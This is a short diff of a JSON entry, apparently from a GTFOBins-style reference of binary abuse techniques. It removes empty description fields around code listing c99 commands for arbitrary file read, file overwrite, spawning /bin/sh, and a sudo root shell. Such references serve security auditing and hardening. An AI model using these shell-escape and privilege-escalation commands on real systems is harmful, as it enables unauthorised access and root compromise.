@@ -2,25 +2,25 @@
   "functions": {
     "file-read": [
       {
-        "description": "",
+        
         "code": "LFILE=file_to_read\nc99 -x c -E \"$LFILE\"\n"
       }
     ],
     "file-write": [
       {
-        "description": "",
+        
         "code": "LFILE=file_to_delete\nc99 -xc /dev/null -o $LFILE\n"
       }
     ],
     "shell": [
       {
-        "description": "",
+        
         "code": "c99 -wrapper /bin/sh,-s .\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo c99 -wrapper /bin/sh,-s .\n"
       }
     ]
